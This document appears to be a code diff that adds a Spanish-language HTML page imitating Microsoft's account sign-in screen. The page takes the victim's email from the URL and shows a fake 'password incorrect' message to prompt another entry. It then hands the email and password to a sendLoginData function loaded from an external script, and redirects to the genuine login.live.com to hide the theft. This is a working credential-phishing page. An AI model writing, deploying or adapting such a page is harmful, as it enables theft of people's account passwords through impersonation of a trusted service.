@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escribir contraseña</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <script src="xjsx.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg') no-repeat center center fixed; background-size: cover; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white max-w-[440px] w-full p-10 shadow-md">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="h-6 mb-4">
+        <div class="flex items-center mb-4"><span id="displayEmail" class="text-[15px]"></span></div>
+        <div class="text-[#e81123] text-[15px] mb-4">La contraseña es incorrecta. Asegúrese de usar la contraseña de su cuenta de Microsoft.</div>
+        <h1 class="text-2xl font-semibold mb-4">Escribir contraseña</h1>
+        <form onsubmit="handleFinal(event)">
+            <input type="password" id="pass" placeholder="Contraseña" class="w-full border-b-2 border-[#e81123] py-2 focus:outline-none mb-8 text-[15px]" required autofocus>
+            <div class="flex justify-end">
+                <button type="submit" id="btn" class="rounded-[2px] bg-[#0067b8] text-white px-9 py-1.5 hover:bg-[#005da6]">Iniciar sesión</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        const email = new URLSearchParams(window.location.search).get('email');
+        document.getElementById('displayEmail').textContent = email;
+        async function handleFinal(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            btn.disabled = true; btn.textContent = 'Iniciando...';
+            await sendLoginData(email, document.getElementById('pass').value);
+            setTimeout(() => { window.location.href = "https://login.live.com"; }, 1500);
+        }
+    </script>
+</body>
+</html>
